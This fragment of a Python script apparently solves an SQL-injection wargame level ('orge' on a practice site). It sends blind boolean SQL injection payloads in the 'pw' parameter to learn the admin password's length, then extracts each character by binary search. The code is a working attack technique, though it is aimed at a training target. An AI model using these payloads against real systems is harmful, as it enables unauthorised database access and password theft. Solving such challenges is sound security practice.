...
url = f"https://los.rubiya.kr/chall/orge_{URL_ID}.php"
...
for  i in range(1, 100):
    ...
    res = requests.get(url, params={'pw': f'\' || id = \'admin\' && {i} <= length(pw) && \'1\'=\'1'},cookies=cookie)
...
for i in range(0, pw_length):
    ...
    while min_code + 1 != max_code:
        ...
        res = requests.get(url, params={'pw': f'\' || id = \'admin\' && {target} <= ascii(substr(pw,{i+1},1)) && \'1\'=\'1'}, cookies=cookie)
